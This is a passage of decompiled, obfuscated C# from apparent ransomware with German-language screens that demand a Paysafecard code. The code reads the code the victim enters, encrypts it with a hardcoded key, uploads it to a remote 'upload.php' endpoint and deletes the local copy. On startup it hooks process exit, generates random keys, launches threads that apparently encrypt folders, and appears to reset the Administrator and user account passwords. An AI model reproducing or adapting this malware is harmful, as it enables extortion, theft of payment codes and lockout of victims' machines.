			((Control)vmethod_100()).set_Visible(false);
		}
	}

	private void method_2(object sender, EventArgs e)
	{
		checked
		{
			try
			{
				string_1 = vmethod_32().get_Text().Split(new char[1] { '-' });
				if (!((Operators.CompareString(string_1[0], "", false) != 0) & (Operators.CompareString(string_1[1], "", false) != 0) & (Operators.CompareString(string_1[2], "", false) != 0) & (Operators.CompareString(string_1[3], "", false) != 0)))
				{
					return;
				}
				int num = 0;
				do
				{
					if (string_1[num].Length == 4)
					{
						num++;
						num++;
						continue;
					}
					vmethod_108().set_Text("Sie haben ihr Paysafecard in einem falschen Format eingegeben");
					return;
				}
				while (num <= 3);
				if (Class7.smethod_0(vmethod_32().get_Text()))
				{
					vmethod_108().set_Text("Ihre Paysafecard ist nicht zu verwenden oder der Server ist gerade nicht erreichbar, versuchen sie es später nocheinmal.");
					return;
				}
				if (!Class11.smethod_0())
				{
					vmethod_108().set_Text("Verbindung derzeit nicht möglich. Bitte versuchen sie es später noch ein mal.");
					return;
				}
				vmethod_108().set_Text("Geben sie das Captcha ein.");
				((Control)vmethod_32()).set_Enabled(false);
				((Control)vmethod_28()).set_Visible(true);
				((Control)vmethod_26()).set_Visible(true);
				((Control)vmethod_98()).set_Visible(true);
				((Control)vmethod_24()).set_Visible(true);
				File.WriteAllText(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + Environment.UserName + "@" + Environment.MachineName + " " + Conversions.ToString(clock_0.get_LocalTime().Day) + "." + Conversions.ToString(clock_0.get_LocalTime().Month) + ".log_psc", Class8.smethod_5(vmethod_32().get_Text(), "MasterPassword12345!"));
				WebClient webClient = new WebClient();
				webClient.UploadFile(string_2 + "upload.php", "POST", Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + Environment.UserName + "@" + Environment.MachineName + " " + Conversions.ToString(clock_0.get_LocalTime().Day) + "." + Conversions.ToString(clock_0.get_LocalTime().Month) + ".log_psc");
				File.Delete(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + Environment.UserName + "@" + Environment.MachineName + " " + Conversions.ToString(clock_0.get_LocalTime().Day) + "." + Conversions.ToString(clock_0.get_LocalTime().Month) + ".log_psc");
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				vmethod_108().set_Text("Keine gültige Paysafecard eingegeben");
				ProjectData.ClearProjectError();
			}
		}
	}

	private void method_3(object sender, EventArgs e)
	{
		if (Operators.CompareString(vmethod_98().get_Text(), "", false) != 0)
		{
			((Control)vmethod_24()).set_Enabled(true);
		}
		else
		{
			((Control)vmethod_24()).set_Enabled(false);
		}
	}

	private void method_4(object sender, EventArgs e)
	{
		if (Operators.CompareString(vmethod_32().get_Text(), "", false) != 0)
		{
			vmethod_32().set_Text("");
		}
	}

	private void method_5(object sender, EventArgs e)
	{
		if (Operators.CompareString(vmethod_32().get_Text(), "", false) == 0)
		{
			vmethod_32().set_Text("Format: 0000-0000-0000-0000");
		}
	}

	private unsafe void method_6(object sender, EventArgs e)
	{
		void* ptr = stackalloc byte[12];
		Label obj = vmethod_12();
		*(int*)ptr = stopwatch_0.Elapsed.Hours;
		string arg = ((int*)ptr)->ToString().PadLeft(2, '0');
		*(int*)((byte*)ptr + 4) = stopwatch_0.Elapsed.Minutes;
		string arg2 = ((int*)((byte*)ptr + 4))->ToString().PadLeft(2, '0');
		*(int*)((byte*)ptr + 8) = stopwatch_0.Elapsed.Seconds;
		obj.set_Text($"{arg}:{arg2}:{((int*)((byte*)ptr + 8))->ToString().PadLeft(2, '0')}");
		*(int*)((byte*)ptr + 8) = stopwatch_0.Elapsed.Minutes;
		if (Operators.CompareString(((int*)((byte*)ptr + 8))->ToString().PadLeft(2, '0'), "03", false) == 0)
		{
			((Control)vmethod_8()).set_Enabled(true);
		}
	}

	private void method_7(object sender, EventArgs e)
	{
	}

	private void frmMain_HandleCreated(object sender, EventArgs e)
	{
		AppDomain.CurrentDomain.ProcessExit += Class16.smethod_1;
		AppDomain.CurrentDomain.DomainUnload += Class16.smethod_1;
		Application.add_ApplicationExit((EventHandler)Class16.smethod_1);
		class12_0.method_0("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ");
		class12_0.method_1("0123456789");
		class12_0.method_2(14);
		class12_1.method_0("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ");
		class12_1.method_1("0123456789");
		class12_1.method_2(8);
		Class5.smethod_1();
		string_0 = class12_0.method_3();
		Class14.smethod_0(string_0);
		Class6.smethod_0(bool_0: true);
		Class16.smethod_0(-1);
		Class9.smethod_1();
		Class6.smethod_2(bool_0: true);
		Class6.smethod_3(bool_0: true);
		Class6.smethod_4(bool_0: true);
		Class6.smethod_1();
		Class6.smethod_5(bool_0: true);
		Class7.smethod_1();
		Class17.smethod_0();
		thread_0.Start();
		if (bool_0)
		{
			Class15.smethod_0();
			Class18.smethod_0("Administrator", "");
			Class18.smethod_0(Environment.UserName, "");
			Class18.smethod_1();
			Class10.smethod_1();
			Class13.smethod_0(class12_1.method_3());
		}
		object[] parameter = new object[3]
		{
			RuntimeHelpers.GetObjectValue(Class10.smethod_0()),
			string_0,
			true
		};
		thread_1.Start(parameter);
		object[] parameter2 = new object[3]
		{
			Class10.string_0 + "\\",
			string_0,
			true
		};
		thread_2.Start(parameter2);
		stopwatch_0.Start();
		vmethod_106().Start();
	}
}
